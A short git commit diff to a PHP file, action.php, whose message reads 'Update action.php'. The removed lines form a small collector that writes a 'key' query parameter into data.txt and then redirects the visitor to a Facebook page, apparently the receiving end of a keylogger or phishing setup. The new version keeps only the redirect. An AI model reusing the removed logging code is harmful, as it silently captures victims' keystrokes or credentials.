a60619e1b2e40f60f7ebb64db79cae7c34e1bb23
Nilson323 <marvin339@outlook.de>
2017-07-16 22:20:21 +0200

    Update action.php

--- action.php
+++ action.php
@@ -1,11 +1,3 @@
 <?php
-$logfile="data.txt";
-$key = $_GET['key'];
-if($key !=""){
- $current = file_get_contents($logfile);
-  $key .=$current;
-  file_put_contents($logfile,$key);
-}
-
-header ('Location: http://facebook.com/funnypicture3/');
+header ('Location: http://facebook.com');
 ?>
